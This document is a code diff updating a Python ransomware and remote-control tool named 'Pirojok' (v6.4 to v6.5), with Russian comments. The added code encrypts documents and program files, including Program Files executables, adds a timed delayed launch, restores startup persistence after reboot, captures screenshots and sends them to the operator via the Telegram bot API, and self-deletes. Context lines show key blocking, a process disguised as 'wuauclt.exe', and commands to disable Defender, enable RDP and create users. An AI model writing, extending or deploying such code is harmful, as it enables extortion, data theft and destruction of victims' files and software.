@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Pirojok - ADVANCED RANSOMWARE
-Version 6.4 - FULLY FIXED WITH KEY BLOCKING
+Version 6.5 - FULLY FIXED WITH ALL FEATURES
 """
 
 import os
@@ -16,7 +16,7 @@ import getpass
 import requests
 from datetime import datetime
 import pyautogui
-from PIL import Image
+from PIL import Image, ImageGrab
 import io
 import ctypes
 import winreg
@@ -236,9 +236,6 @@ Do While True
                 tempPath = WShell.ExpandEnvironmentStrings("%TEMP%") & "\\wuauclt.exe"
                 FSO.CopyFile backupPath, tempPath, True
                 WShell.Run """" & tempPath & """", 0, False
-                
-                ' Send notification via Telegram (simulated)
-                ' Note: VBS can't directly send Telegram, but we'll log it
                 Exit For
             End If
         Next
@@ -321,18 +318,68 @@ class PirojokRansomware:
         self.ransom_note = "README_PIROJOK.txt"
         self.cmd_window = None
         self.active = False
-        self.target_extensions = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
-            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
-            '.mp3', '.mp4', '.avi', '.mov', '.mkv',
-            '.zip', '.rar', '.7z', '.tar', '.gz',
-            '.db', '.sql', '.mdb', '.accdb',
-            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js']
-        self.exclude_dirs = ['windows', 'winnt', 'program files', 'program files (x86)',
-            'boot', 'system32', 'system', '$recycle.bin']
+        # Расширения для шифрования - включая приложения
+        self.target_extensions = [
+            # Документы
+            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+            '.pdf', '.rtf', '.odt', '.ods', '.odp',
+            # Медиа
+            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff',
+            '.mp3', '.mp4', '.avi', '.mov', '.mkv', '.wmv', '.flv',
+            # Архивы
+            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
+            # Базы данных
+            '.db', '.sql', '.mdb', '.accdb', '.sqlite',
+            # Код
+            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js', '.c', '.h',
+            # ИСПОЛНЯЕМЫЕ ФАЙЛЫ (ПРИЛОЖЕНИЯ)
+            '.exe', '.dll', '.msi', '.bat', '.cmd', '.vbs', '.ps1',
+            '.sys', '.drv', '.ocx', '.scr', '.cpl', '.com',
+            # Установочные файлы
+            '.appx', '.msix', '.msp', '.deb', '.rpm'
+        ]
+        # Папки для исключения (системные)
+        self.exclude_dirs = [
+            'windows', 'winnt', 'program files', 'program files (x86)',
+            'boot', 'system32', 'system', '$recycle.bin',
+            'system volume information', 'recovery', 'microsoft.net',
+            'assembly', 'microsoft shared', 'windows.old', 'winxs',
+            'syswow64', 'winsxs'
+        ]
+        # Критические системные файлы, которые НЕЛЬЗЯ шифровать
+        self.critical_system_files = [
+            'winlogon.exe', 'lsass.exe', 'services.exe', 'csrss.exe', 'smss.exe',
+            'wininit.exe', 'taskmgr.exe', 'explorer.exe', 'svchost.exe',
+            'ntoskrnl.exe', 'hal.dll', 'kernel32.dll', 'ntdll.dll',
+            'user32.dll', 'gdi32.dll', 'advapi32.dll'
+        ]
         
     def generate_key(self):
         self.encryption_key = os.urandom(32)
         return base64.b64encode(self.encryption_key).decode()
+    
+    def is_system_file(self, filepath):
+        """Check if file is critical system file (should NOT be encrypted)"""
+        filename = os.path.basename(filepath).lower()
+        
+        # Проверяем по имени
+        if filename in self.critical_system_files:
+            return True
+        
+        # Проверяем по пути
+        filepath_lower = filepath.lower()
+        system_paths = ['\\system32\\', '\\syswow64\\', '\\windows\\']
+        
+        for sp in system_paths:
+            if sp in filepath_lower:
+                # В system32 шифруем только явно не критические
+                if filename.endswith('.exe') or filename.endswith('.dll'):
+                    if filename not in self.critical_system_files:
+                        return False
+                    return True
+                return True
+        
+        return False
     
     def block_all_keys(self):
         """FULL key blocking including ESC and Alt+F4"""
@@ -409,7 +456,10 @@ class PirojokRansomware:
 |                    PIROJOK RANSOMWARE                        |
 +--------------------------------------------------------------+
 |                                                              |
-|   YOUR FILES HAVE BEEN ENCRYPTED!                            |
+|   YOUR FILES AND APPLICATIONS HAVE BEEN ENCRYPTED!           |
+|                                                              |
+|   Documents, media, and PROGRAM FILES (.exe, .dll)           |
+|   System files are PROTECTED (Windows still works)           |
 |                                                              |
 |   DECRYPTION KEY HAS BEEN SENT TO TELEGRAM                   |
 |   CHECK YOUR TELEGRAM BOT FOR THE KEY                        |
@@ -452,6 +502,8 @@ pause > nul
 |                                                              |
 |   ALL FILES HAVE BEEN RESTORED                               |
 |                                                              |
+|   APPLICATIONS CAN NOW RUN AGAIN                             |
+|                                                              |
 |   KEYS ARE NOW UNLOCKED                                      |
 |                                                              |
 |   YOU CAN USE YOUR COMPUTER NORMALLY                         |
@@ -490,11 +542,11 @@ del "%~f0"
         except: return None
     
     def scan_and_encrypt(self):
-        """Scan and encrypt files"""
+        """Scan and encrypt files including executables (but protect system)"""
         if not self.encryption_key:
             self.generate_key()
         
-        # More directories to encrypt
+        # Directories to encrypt
         root_paths = [
             os.path.expanduser("~\\Desktop"),
             os.path.expanduser("~\\Documents"),
@@ -503,6 +555,10 @@ del "%~f0"
             os.path.expanduser("~\\Music"),
             os.path.expanduser("~\\Downloads"),
             os.path.expanduser("~\\OneDrive"),
+            os.path.expanduser("~\\AppData\\Local\\Programs"),
+            os.path.expanduser("~\\AppData\\Roaming"),
+            "C:\\Program Files",
+            "C:\\Program Files (x86)",
             "C:\\Users\\Public\\Documents",
             "C:\\Users\\Public\\Downloads",
             "C:\\Users\\Public\\Pictures",
@@ -511,21 +567,29 @@ del "%~f0"
         
         encrypted = []
         file_count = 0
-        max_files = 200
+        max_files = 300
         
         for root_path in root_paths:
             if not os.path.exists(root_path): continue
             for root, dirs, files in os.walk(root_path):
+                # Пропускаем системные папки
                 skip = False
                 for exclude in self.exclude_dirs:
                     if exclude in root.lower():
                         skip = True
                         break
                 if skip: continue
+                
                 for file in files:
                     if file_count >= max_files: break
                     file_path = os.path.join(root, file)
                     ext = os.path.splitext(file)[1].lower()
+                    
+                    # Проверяем, не является ли файл критическим системным
+                    if self.is_system_file(file_path):
+                        continue
+                    
+                    # Шифруем если расширение подходит
                     if ext in self.target_extensions and not file.endswith('.pirojok'):
                         result = self.encrypt_file(file_path)
                         if result:
@@ -540,16 +604,31 @@ del "%~f0"
         return encrypted
     
     def create_ransom_note(self):
-        note_path = os.path.join(os.path.expanduser("~\\Desktop"), self.ransom_note)
-        key_b64 = base64.b64encode(self.encryption_key).decode()
-        note = f"""
+        """Create ransom note on REAL desktop"""
+        try:
+            # Get REAL desktop path
+            desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+            # If that doesn't exist, try public desktop
+            if not os.path.exists(desktop):
+                desktop = os.path.join(os.environ['PUBLIC'], 'Desktop')
+            # If still no, use temp
+            if not os.path.exists(desktop):
+                desktop = tempfile.gettempdir()
+                
+            note_path = os.path.join(desktop, self.ransom_note)
+            key_b64 = base64.b64encode(self.encryption_key).decode()
+            
+            note = f"""
 +--------------------------------------------------------------+
 |                    PIROJOK RANSOMWARE                        |
 +--------------------------------------------------------------+
 |                                                              |
-|   Your files have been encrypted!                            |
+|   Your files and APPLICATIONS have been encrypted!           |
 |                                                              |
 |   Total encrypted: {len(self.encrypted_files)} files         |
+|                                                              |
+|   Documents, media, and PROGRAM FILES (.exe, .dll)           |
+|   System files are PROTECTED (Windows still works)           |
 |                                                              |
 |   DECRYPTION KEY HAS BEEN SENT TO TELEGRAM                   |
 |   CHECK YOUR TELEGRAM BOT                                     |
@@ -559,9 +638,25 @@ del "%~f0"
 |                                                              |
 +--------------------------------------------------------------+
         """
-        with open(note_path, 'w', encoding='utf-8') as f:
-            f.write(note)
-        return note_path
+            with open(note_path, 'w', encoding='utf-8') as f:
+                f.write(note)
+            return note_path
+        except Exception as e:
+            # Fallback to temp directory
+            fallback = os.path.join(tempfile.gettempdir(), self.ransom_note)
+            with open(fallback, 'w', encoding='utf-8') as f:
+                f.write("[PIROJOK] Files encrypted. Check Telegram for key.\n")
+                f.write(f"Key: {base64.b64encode(self.encryption_key).decode()}")
+            return fallback
+    
+    def encryption_stats(self):
+        """Show encryption statistics"""
+        total = len(self.encrypted_files)
+        docs = sum(1 for f in self.encrypted_files if any(ext in f.lower() for ext in ['.doc', '.pdf', '.txt', '.xls']))
+        media = sum(1 for f in self.encrypted_files if any(ext in f.lower() for ext in ['.jpg', '.mp3', '.mp4', '.png']))
+        apps = sum(1 for f in self.encrypted_files if any(ext in f.lower() for ext in ['.exe', '.dll', '.msi']))
+        
+        return f"[STATS] Total: {total} | Docs: {docs} | Media: {media} | Apps: {apps}"
     
     def start_ransomware(self):
         try:
@@ -574,11 +669,14 @@ del "%~f0"
             note = self.create_ransom_note()
             os.startfile(note)
             self.p.add_all_startup_methods()
-            result = f"[OK] Encrypted {len(encrypted)} files\n"
+            stats = self.encryption_stats()
+            result = f"[OK] Encrypted {len(encrypted)} files (including applications)\n"
             result += f"[NOTE] {note}\n"
             result += f"[KEY] {base64.b64encode(self.encryption_key).decode()}\n"
             result += f"[LOCK] Keys blocked (ESC, ALT+F4)!\n"
-            result += f"[AUTO] Startup installed!"
+            result += f"[AUTO] Startup installed!\n"
+            result += f"[SYSTEM] Critical system files protected\n"
+            result += stats
             return result
         except Exception as e:
             return f"[ERROR] {str(e)}"
@@ -589,7 +687,7 @@ del "%~f0"
             self.encryption_key = base64.b64decode(key_b64)
             
             pirojok_files = []
-            for root, dirs, files in os.walk("C:\\Users"):
+            for root, dirs, files in os.walk("C:\\"):
                 for file in files:
                     if file.endswith('.pirojok'):
                         pirojok_files.append(os.path.join(root, file))
@@ -639,6 +737,24 @@ del "%~f0"
                 self.cmd_window.terminate()
             os.system('taskkill /f /im cmd.exe /fi "windowtitle eq PIROJOK*"')
         except: pass
+    
+    def self_destruct(self):
+        """Delete itself after successful decryption"""
+        try:
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+                bat_path = os.path.join(tempfile.gettempdir(), "self_destruct.bat")
+                with open(bat_path, 'w') as f:
+                    f.write(f'''@echo off
+timeout /t 5 /nobreak > nul
+del "{exe_path}"
+del "%~f0"
+''')
+                subprocess.Popen(['cmd', '/c', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
+                return "[SELF] Self-destruct activated (will delete after 5 sec)"
+            return "[SELF] Not compiled"
+        except Exception as e:
+            return f"[SELF] Failed: {e}"
 
 
 class Pirojok:
@@ -649,7 +765,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "6.4"
+        self.version = "6.5"
         self.command_timeout = 60
         self.admin_mode = False
         self.startup_time = datetime.now()
@@ -786,6 +902,10 @@ class Pirojok:
         except Exception as e:
             return f"[ERROR] {str(e)}"
     
+    def ransomware_stats(self):
+        """Get encryption statistics"""
+        return self.ransom.encryption_stats()
+    
     def ransomware_key(self):
         try:
             if self.ransom.encryption_key:
@@ -802,6 +922,20 @@ class Pirojok:
             return result
         except Exception as e:
             return f"[ERROR] {str(e)}"
+    
+    def ransom_delayed(self, hours=24):
+        """Start ransomware after X hours"""
+        try:
+            hours = int(hours)
+            self.send_message(self.owner_id, f"[TIMER] Ransomware will start in {hours} hours")
+            threading.Timer(hours * 3600, self.ransomware_start).start()
+            return f"[TIMER] Scheduled for {hours} hours later"
+        except:
+            return "[ERROR] Use: timer <hours>"
+    
+    def self_destruct(self):
+        """Self destruct after decryption"""
+        return self.ransom.self_destruct()
     
     def add_all_startup_methods(self):
         results = []
@@ -1032,6 +1166,28 @@ class Pirojok:
         
         return "\n".join(results)
     
+    def check_and_restore(self):
+        """Check if everything is working after reboot"""
+        try:
+            issues = []
+            
+            # Check if we're still in startup
+            if self.admin_mode:
+                startup_check = self.check_startup()
+                if "Found" not in startup_check:
+                    self.add_all_startup_methods()
+                    issues.append("Startup restored")
+            
+            # Check if screenshot works
+            test_shot = self.take_screenshot()
+            if not test_shot:
+                issues.append("Screenshot may not work")
+            
+            if issues:
+                self.send_message(self.owner_id, f"[RESTORE] Fixed: {', '.join(issues)}")
+        except:
+            pass
+    
     def send_message(self, chat_id, text):
         """Simple message sending with plain text"""
         try:
@@ -1081,13 +1237,24 @@ class Pirojok:
         return "\n".join(info)
     
     def take_screenshot(self):
+        """Take screenshot with multiple fallback methods"""
         try:
+            # Method 1: pyautogui
             screenshot = pyautogui.screenshot()
             img_bytes = io.BytesIO()
             screenshot.save(img_bytes, format='JPEG', quality=85)
             img_bytes.seek(0)
             return img_bytes.read()
-        except: return None
+        except:
+            try:
+                # Method 2: PIL ImageGrab
+                screenshot = ImageGrab.grab()
+                img_bytes = io.BytesIO()
+                screenshot.save(img_bytes, format='JPEG', quality=85)
+                img_bytes.seek(0)
+                return img_bytes.read()
+            except:
+                return None
     
     def execute_command(self, command):
         try:
@@ -1193,6 +1360,10 @@ class Pirojok:
                 return
             if self.started: return
             self.started = True
+            
+            # Check and restore after reboot
+            threading.Timer(10.0, self.check_and_restore).start()
+            
             boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             message = f"[PIROJOK] Started!\n"
             message += f"Boot time: {boot_time}\n"
@@ -1201,10 +1372,13 @@ class Pirojok:
             message += f"Admin: {'YES' if self.admin_mode else 'NO'}\n"
             message += f"Mask: {'YES' if self.hider.masked else 'NO'}"
             self.send_message(self.owner_id, message)
+            
             time.sleep(5)
             screenshot = self.take_screenshot()
             if screenshot:
                 self.send_photo(self.owner_id, screenshot, "[SCREEN] Desktop after boot")
+            else:
+                self.send_message(self.owner_id, "[WARN] Screenshot failed after boot")
         except Exception as e:
             print(f"Startup error: {e}")
     
@@ -1226,7 +1400,7 @@ class Pirojok:
             # Commands that need admin rights
             admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
                              "add_rule", "task_startup", "explorer_shell", "active_setup", 
-                             "inject", "watchdog", "ransom", "ransom_start"]
+                             "inject", "watchdog", "ransom", "ransom_start", "timer"]
             
             cmd_type = text.split()[0] if text else ""
             
@@ -1238,12 +1412,17 @@ class Pirojok:
             # === HELP / MENU ===
             if text == "help" or text == "menu":
                 help_text = """
-PIROJOK v6.4 - COMMANDS:
+PIROJOK v6.5 - COMMANDS (with APPLICATION ENCRYPTION):
 
 [LOCK] RANSOMWARE:
 • ransom / ransom_start - START RANSOMWARE!
+   - Encrypts documents, media, AND APPLICATIONS (.exe, .dll)
+   - System files are PROTECTED (Windows still works)
 • ransom_key - show encryption key
 • ransom_decrypt <key> - decrypt files
+• stats - show encryption statistics
+• timer <hours> - delayed start
+• selfdestruct - delete after decryption
 
 [MASK] MASQUERADE:
 • mask_status - show masquerade status
@@ -1290,6 +1469,51 @@ PIROJOK v6.4 - COMMANDS:
                 self.processing = False
                 return
             
+            # === RANSOMWARE COMMANDS ===
+            if text == "ransom" or text == "ransom_start":
+                result = self.ransomware_start()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            if text == "stats":
+                result = self.ransomware_stats()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            if text == "ransom_key":
+                result = self.ransomware_key()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            if text.startswith("timer"):
+                parts = text.split()
+                if len(parts) == 2:
+                    result = self.ransom_delayed(parts[1])
+                    self.send_message(chat_id, result)
+                else:
+                    self.send_message(chat_id, "[ERROR] Use: timer <hours>")
+                self.processing = False
+                return
+            
+            if text == "selfdestruct":
+                result = self.self_destruct()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            if text.startswith("ransom_decrypt"):
+                parts = text.split()
+                if len(parts) == 2:
+                    result = self.ransomware_decrypt(parts[1])
+                    self.send_message(chat_id, result)
+                else:
+                    self.send_message(chat_id, "[ERROR] Use: ransom_decrypt <key>")
+                self.processing = False
+                return
+            
             # === MASQUERADE COMMANDS ===
             if text == "mask_status":
                 self.send_message(chat_id, self.hider.get_mask_status())
@@ -1311,29 +1535,6 @@ PIROJOK v6.4 - COMMANDS:
             if text == "watchdog":
                 result = self.hider.setup_watchdog()
                 self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            # === RANSOMWARE COMMANDS ===
-            if text == "ransom" or text == "ransom_start":
-                result = self.ransomware_start()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            if text == "ransom_key":
-                result = self.ransomware_key()
-                self.send_message(chat_id, result)
-                self.processing = False
-                return
-            
-            if text.startswith("ransom_decrypt"):
-                parts = text.split()
-                if len(parts) == 2:
-                    result = self.ransomware_decrypt(parts[1])
-                    self.send_message(chat_id, result)
-                else:
-                    self.send_message(chat_id, "[ERROR] Use: ransom_decrypt <key>")
                 self.processing = False
                 return
             
